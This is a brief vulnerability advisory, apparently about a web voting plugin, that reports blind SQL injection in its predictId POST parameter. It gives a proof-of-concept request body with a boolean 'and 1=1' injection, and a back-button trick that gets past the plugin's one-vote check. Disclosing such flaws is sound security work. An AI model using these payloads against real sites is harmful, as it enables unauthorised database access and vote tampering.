=====================
Vulnerability Details
=====================

PredictId parameter in post request is vulnerable to blind SQL injection.

===============
Testing Details
===============

When attempting follow-up submissions, the plugin states that you've already voted. This can easily be circumvented by using your browser's back button.

=================
Injection Example
=================

Using Burp Suite or other proxy, intercept the post request when submitting your answer and append and 1=1 to the predictId parameter before forwarding:

predictSelection=1&predictId=1 and 1=1&postAction=submitVote&submitVote.x=70&submitVote.y=26

In the example above, the statement evaluates to true and the vote count increases by 1.

Sending a new request with "predictId=1 and 1=0" will not increase the vote count.
